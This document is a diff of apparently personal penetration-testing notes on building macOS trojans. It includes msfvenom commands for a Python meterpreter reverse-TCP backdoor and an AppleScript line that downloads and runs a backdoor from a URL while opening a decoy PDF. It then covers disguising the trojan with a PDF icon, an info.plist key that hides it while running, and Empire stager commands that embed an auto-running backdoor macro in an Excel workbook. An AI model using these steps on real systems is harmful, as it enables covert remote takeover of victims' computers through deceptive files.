@@ -302,7 +302,7 @@ do shell script "[+] ; echo...."
 - select the file format of Application  
 
 2. Option Msfvenom and download and execute metod
-Use msfvenom to generate a backdor
+- Use msfvenom to generate a backdor
 ```
 msfvenom --list payloads
 msfvenom --payload python/meterpreter/reverse_tcp --payload-options
@@ -312,6 +312,70 @@ msfvenom --payload python/meterpreter/reverse_tcp  LPORT=XXXX  LHOST=XXXXXXXX > 
 ```
 do shell script "cd /tmp/ &&  curl [URL PDF] -O -s && open pdf.pdf; curl [URL to .py backdoor] -O -s && python backdoor.py"
 ```
+
+Changing Trojan's Icon  
+With Mac OS, you can see that with PDF files
+it actually shows a preview of the content of the file.
+So, it doesn't use one icon, the icon will actually change depending on the PDF file.
+I zoomed in, in to the File Manager,
+I took a screenshot, I opened it with Gimp
+and then I cropped the screen to the icon, that the default file would have.
+
+if you are sending a file as an image,
+then the job is easy, you can just use this online service to convert your image to an icon
+
+but if you're mimicking something simple like a video or an image or an mp3 file,
+then you can just use or even a word document, then you can just use the generic icon for that file type.
+
+Now, once you have the image that you want to use and I have this one that I created like I said before,
+you, you need to convert this image to a '.icns' extension
+because that's the extension that Mac uses for its icons
+
+Go to script editor > new from templetes > Cocoa -AppleScript Applet
+- copy past all you script
+- click the [ |] icon on top
+- copi the name of the default icns the applet.icns
+- delet the dafaul .icns and drag the one we made rename it to the applet.icns
+- go to File > Export > uncheck the show startup screan > Format aplication
+
+
+Configuring The Trojan To Run Silently  
+
+The only problem right now is if you look at the status bar,
+you'll see when we executed the backdoor it created two processes.
+So it created a process here, which is called the research
+and that's actually the process for the backdoor itself.
+So this is the process that connected to my computer and it's allowing me to hack that computer
+and at the same time we see a preview here and this is the PDF that the backdoor downloaded.
+
+rigt click the backdoor > Show Package Content > go Contents > Open info.plist > open in text editor  
+add this key entry after de dict and befor the first kay  
+```
+<key>NSUIElement</key>
+<string>1</string>
+```
+
+Embedding Backdoor In A Legitimate Microsoft Office Document
+- Create backdoor macro in empire
+```
+usestager osx/macro
+set Listener NAME
+set OutFile /path
+execute
+```
+copy the backdoor macro and past it in for example exel View > Viev Macros
+- Set macro name to 
+```
+Auto_Open
+```
+- Select the curent workbook in Macros in:
+- click on plus
+- select all delet it and paste the macro
+- Change the name inside the macro
+```
+Private Sub Auto_Open()
+```
+- Seve the file like Exel 97-2004 .xls
 
 ## Veil
 Kali 2020
